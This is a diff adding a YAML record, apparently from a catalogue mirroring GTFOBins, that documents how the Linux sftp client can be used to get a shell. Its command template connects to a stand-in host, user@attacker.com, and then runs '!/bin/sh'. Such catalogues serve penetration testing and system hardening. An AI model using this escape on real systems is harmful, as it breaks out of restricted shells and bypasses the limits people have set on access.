@@ -1,0 +1,26 @@
+id: gtfobins/sftp/shell/unprivileged
+type: binary
+platform: linux
+name: sftp
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'sftp user@attacker.com
+
+    !/bin/sh'
+  comment: This still requires a successfull connection to the server.
+references:
+- https://gtfobins.github.io/gtfobins/sftp/
+tags:
+- linux
+- unix
+- gtfobins
